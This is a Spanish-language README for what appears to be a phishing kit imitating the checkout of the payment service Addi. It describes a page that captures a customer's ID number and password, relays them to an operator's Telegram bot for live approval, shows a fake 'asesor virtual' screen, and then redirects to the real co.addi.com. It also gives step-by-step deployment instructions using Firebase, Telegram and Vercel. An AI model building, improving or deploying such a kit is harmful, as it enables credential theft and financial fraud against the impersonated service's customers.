# Addi Checkout — validación por bot de Telegram (sin dashboard)

Flujo corto de verificación: el cliente ingresa **usuario y contraseña** y el **asesor valida desde su bot de Telegram** con botones. Al aprobar, el cliente ve «Verificación exitosa», luego una pantalla con el asesor virtual (WhatsApp) **y al final es redirigido a `https://co.addi.com`**.

## 🧩 Flujo actual

```
1. Usuario (cédula)  → bot: ✓ Cuenta existe / ✗ Cuenta no existe
2. Contraseña        → bot: ✓ Verificación exitosa / ✗ Contraseña incorrecta
3. Pantalla de carga «Verificación exitosa» (la activa el asesor desde el bot)
4. Asesor virtual (whatsapp.svg): «En unos momentos se comunicará con usted un asesor virtual»
5. ▶ Redirección automática a https://co.addi.com
```

> Los pasos antiguos (banco, cupo, OTP, cuotas, identidad, éxito) fueron **eliminados**.

## 🤖 Botones que recibes en el bot de Telegram

| Botón | Qué hace |
|---|---|
| `✓ Cuenta existe` / `✗ Cuenta no existe` | Valida la cédula del paso 1 |
| `✓ Verificación exitosa` / `✗ Contraseña incorrecta` | Aprueba o rechaza el paso 2. Al aprobar se activa la pantalla de carga y el cliente termina redirigido |
| `🗑 Borrar sesión` | Elimina la sesión |

Otros comandos del bot: `/menu`, `/solicitudes`, `/probar`, `/borrar`.

## 📁 Archivos

| Archivo | Qué es |
|---|---|
| `index.html` | Checkout del cliente (los 2 pasos + carga + asesor virtual + redirección) |
| `api/notificar.js` | Reenvía al bot de Telegram los mensajes con botones |
| `api/bot.js` | Webhook del bot: recibe tus botones y escribe el `comando` en Firestore |
| `firestore.rules.json` | Reglas de seguridad (pegarlas en la consola) |
| `GUIA-CONFIGURACION.txt` | 📖 **Guía paso a paso para configurar Firebase + Telegram + Vercel** |
| `.env.example` | Plantilla de variables de entorno |
| `*.svg / *.gif / *.png` | Recursos visuales |

## 🚀 Puesta en marcha (resumen)

1. **Firebase**: crea el proyecto, activa Firestore y **Authentication → Anónimo**.
2. **Reglas**: pega `firestore.rules.json` en Firestore → Rules y cambia `CAMBIA-ESTE-TOKEN` por tu token.
3. **Configuración**: cambia los 6 datos de `FIREBASE_CONFIG` en `index.html` y el `ADMIN_TOKEN`.
4. **Bot**: crea el bot con @BotFather → token → envíale un mensaje → saca tu `chat id` de `getUpdates`.
5. **Vercel**: sube el proyecto y define las variables de entorno (ver `.env.example`).
6. **Webhook** (una vez): `https://api.telegram.org/bot<TU_TOKEN>/setWebhook?url=https://TU-DOMINIO/api/bot`

Detalles completos en **`GUIA-CONFIGURACION.txt`**.

## ▶️ Probar en local

```bash
vercel dev
```
Abre `http://localhost:3000` para el flujo del cliente. Para probar los botones del bot se necesita una URL pública (Previews de Vercel o `ngrok` apuntando a `http://localhost:3000/api/bot`).

## 🔒 Seguridad

- `TELEGRAM_BOT_TOKEN`, `ADMIN_CHAT_ID` y `FIREBASE_ADMIN_TOKEN` viven solo en **variables de entorno de Vercel** (nunca en el repo).
- El token de asesor debe ser el mismo en: `firestore.rules.json`, `index.html → ADMIN_TOKEN` y Vercel.

## ⚠️ Nota producción real

El bot escribe el `comando` usando login anónimo + `adminToken` (según las reglas). El siguiente nivel es usar **Admin SDK** de Firebase en `/api/bot` con credenciales de servicio.